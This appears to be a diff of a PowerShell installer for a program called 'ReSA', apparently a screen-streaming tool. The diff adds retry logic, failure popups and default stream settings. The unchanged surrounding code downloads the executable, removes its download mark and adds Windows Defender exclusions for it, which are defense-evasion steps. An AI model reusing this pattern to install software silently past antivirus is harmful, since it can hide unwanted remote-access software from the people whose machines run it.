@@ -48,6 +48,53 @@ function Fail-Install {
     }
 }
 
+function Show-InstallPopup {
+    param([string]$Text)
+    try {
+        $ws = New-Object -ComObject WScript.Shell
+        $null = $ws.Popup($Text, 0, "ReSA Install", 48)
+    } catch {
+        $null = $_
+    }
+}
+
+function Write-DefaultSettings {
+    param([string]$SettingsPath)
+    $json = @'
+{
+  "streamWidth": 1024,
+  "fps": 8,
+  "quality": 45
+}
+'@.Trim()
+    try {
+        [IO.File]::WriteAllText($SettingsPath, $json, (New-Object System.Text.UTF8Encoding $false))
+        Write-InstallLog ("settings ok: " + $SettingsPath)
+    } catch {
+        Write-InstallLog ("settings skipped: " + $_.Exception.Message)
+    }
+}
+
+function Stop-ReSAProcesses {
+    for ($i = 0; $i -lt 3; $i++) {
+        $procs = Get-Process -Name "ReSA" -ErrorAction SilentlyContinue
+        if (-not $procs) {
+            return
+        }
+        $procs | Stop-Process -Force -ErrorAction SilentlyContinue
+        Start-Sleep -Milliseconds 800
+    }
+}
+
+function Disable-WatchdogTask {
+    try {
+        Disable-ScheduledTask -TaskName "ReSA-Watchdog" -ErrorAction SilentlyContinue | Out-Null
+        Write-InstallLog "watchdog paused"
+    } catch {
+        Write-InstallLog ("watchdog pause skipped: " + $_.Exception.Message)
+    }
+}
+
 function Download-File {
     param(
         [string]$Url,
@@ -63,10 +110,11 @@ function Download-File {
 
     $curl = Join-Path $env:SystemRoot "System32\curl.exe"
     if (Test-Path -LiteralPath $curl) {
-        & $curl -fsSL --retry 3 --retry-delay 2 --connect-timeout 30 --max-time 600 -o $OutFile $Url
+        & $curl -fsSL --retry 3 --retry-delay 2 --connect-timeout 30 --max-time 900 -o $OutFile $Url
         if ($LASTEXITCODE -eq 0 -and (Test-Path -LiteralPath $OutFile)) {
             return
         }
+        Write-InstallLog ("curl failed: exit " + $LASTEXITCODE + " url " + $Url)
     }
 
     $iwrArgs = @{
@@ -163,7 +211,8 @@ try {
 
 Add-DefenderExclusion -Path $Dir -ExePath $Exe | Out-Null
 
-Get-Process -Name "ReSA" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+Disable-WatchdogTask
+Stop-ReSAProcesses
 Start-Sleep -Milliseconds 500
 
 function Remove-PyiExtractDirs {
@@ -182,6 +231,9 @@ Remove-PyiExtractDirs -ParentDir $env:TEMP
 
 $Url = $BaseUrl + "/ReSA.exe"
 Write-InstallLog ("download: " + $Url)
+if (-not $Silent) {
+    Write-Host "Downloading ReSA.exe (~55MB), please wait 1-3 minutes..."
+}
 
 if (Test-Path -LiteralPath $Temp) {
     Remove-Item -LiteralPath $Temp -Force -ErrorAction SilentlyContinue
@@ -210,14 +262,29 @@ if (Test-Path -LiteralPath $Exe) {
     Remove-Item -LiteralPath $Exe -Force -ErrorAction SilentlyContinue
 }
 
-try {
-    Move-Item -LiteralPath $Temp -Destination $Exe -Force
-} catch {
-    Fail-Install ("copy failed: " + $_.Exception.Message)
+$moved = $false
+for ($try = 0; $try -lt 5; $try++) {
+    Stop-ReSAProcesses
+    try {
+        Move-Item -LiteralPath $Temp -Destination $Exe -Force
+        $moved = $true
+        break
+    } catch {
+        Write-InstallLog ("copy retry " + ($try + 1) + ": " + $_.Exception.Message)
+        Start-Sleep -Seconds 1
+    }
+}
+if (-not $moved) {
+    Fail-Install ("copy failed after retries: " + $Exe)
+    if ($Silent) {
+        Show-InstallPopup ("ReSA install failed.`nSee log:`n" + $LogFile)
+    }
     exit 1
 }
 
 Unblock-File -LiteralPath $Exe -ErrorAction SilentlyContinue
+
+Write-DefaultSettings -SettingsPath (Join-Path $Dir "settings.json")
 
 Add-DefenderExclusion -Path $Dir -ExePath $Exe | Out-Null
 
@@ -263,7 +330,13 @@ try {
 }
 
 Write-InstallLog "install complete"
+if (-not $Silent) {
+    Write-Host "ReSA install complete." -ForegroundColor Green
+}
 if ($script:HadError) {
+    if ($Silent) {
+        Show-InstallPopup ("ReSA install failed.`nSee log:`n" + $LogFile)
+    }
     exit 1
 }
 exit 0
